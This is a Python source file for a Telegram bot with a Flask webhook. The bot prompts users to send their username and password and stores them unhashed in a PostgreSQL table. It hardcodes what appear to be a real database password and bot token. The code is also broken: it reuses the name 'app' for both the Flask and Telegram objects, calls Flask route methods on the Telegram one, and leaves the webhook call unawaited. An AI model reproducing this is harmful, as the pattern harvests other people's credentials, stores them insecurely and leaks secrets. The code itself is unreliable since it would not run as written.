from flask import Flask, request
import psycopg2
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Flask app for webhook
app = Flask(__name__)

# Database connection string
DB_URL = "postgresql://users_info_6gu3_user:RFH4r8MZg0bMII5ruj5Gly9fwdTLAfSV@dpg-cr6vbghu0jms73ffc840-a/users_info_6gu3"

# Telegram bot token
BOT_TOKEN = "7403620437:AAHUzMiWQt_AHAZ-PwYY0spVfcCKpWFKQoE"

# Webhook URL
WEBHOOK_URL = "https://ftheiromai.onrender.com/telegram-webhook"

# Define the /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('Welcome! Please send your username and password in the format: username,password')

# Define a message handler for user data
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = update.message.text
    if ',' in text:
        username, password = text.split(',', 1)
        try:
            conn = psycopg2.connect(DB_URL)
            cur = conn.cursor()
            cur.execute("INSERT INTO Users (username, password) VALUES (%s, %s)", (username.strip(), password.strip()))
            conn.commit()
            cur.close()
            conn.close()
            await update.message.reply_text('Username and password saved successfully!')
        except Exception as e:
            await update.message.reply_text(f'Failed to save data: {e}')
    else:
        await update.message.reply_text('Please send your username and password in the correct format: username,password')

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Command handler for /start
    app.add_handler(CommandHandler("start", start))

    # Message handler for capturing username and password
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Set webhook
    app.bot.set_webhook(WEBHOOK_URL)

    # Flask route for webhook
    @app.route('/telegram-webhook', methods=['POST'])
    def webhook():
        update = Update.de_json(request.get_json(), app.bot)
        app.process_update(update)
        return 'ok'

    # Start the Flask app
    app.run(host="0.0.0.0", port=5000)

if __name__ == '__main__':
    main()
